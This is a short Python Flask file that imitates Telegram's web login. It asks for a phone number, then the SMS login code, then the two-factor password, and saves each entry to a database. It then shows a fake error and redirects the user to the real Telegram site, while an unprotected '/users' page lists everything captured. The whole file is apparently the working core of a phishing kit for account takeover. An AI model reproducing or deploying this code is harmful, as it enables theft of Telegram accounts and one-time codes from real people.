from flask import Blueprint, render_template, request, redirect, url_for
from .models import User
from . import db

auth = Blueprint('auth', __name__)

@auth.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        phone = request.form.get('phone')

        new_user = User(phone=phone)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('auth.login_code', phone=phone))
    
    return render_template("telegram_number.html")

@auth.route('/login_code', methods=['GET', 'POST'])
def login_code():
    phone = request.args.get('phone')


    if request.method == 'POST':
        code = request.form.get('code')

        new_user = User(code=code)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('auth.login_factor'))

    return render_template("telegram_phone_code.html", phone=phone)

@auth.route('/login_factor', methods=['GET', 'POST'])
def login_factor():

    if request.method == 'POST':
        password = request.form.get('password')

        new_user = User(password=password)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('auth.login_error'))

    return render_template("telegram_factor.html")

@auth.route('/login_error', methods=['GET', 'POST'])
def login_error():

    if request.method == 'POST':
        return redirect('https://web.telegram.org/')

    return render_template("telegram_error.html")

@auth.route('/users', methods=['GET'])
def users():
    users = User.query.all()
    return render_template("users.html", users=users)
